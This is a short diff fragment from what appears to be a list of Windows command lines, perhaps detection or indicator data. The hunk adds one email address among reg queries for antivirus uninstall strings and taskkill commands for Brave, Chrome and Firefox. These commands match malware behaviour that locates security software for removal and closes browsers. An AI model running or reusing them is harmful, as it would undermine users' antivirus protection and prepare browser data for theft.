@@ -131,6 +131,7 @@ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\{96A251BD-753
 reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\G DATA ANTIVIRUS /v UninstallString
 reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\REC /v UninstallString
 reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{4073CD02-7996-48D7-AFDF-297676C27CA6} /v UninstallString
+support@top.rodeo
 taskkill /IM brave.exe
 taskkill /IM chrome.exe
 taskkill /IM firefox.exe
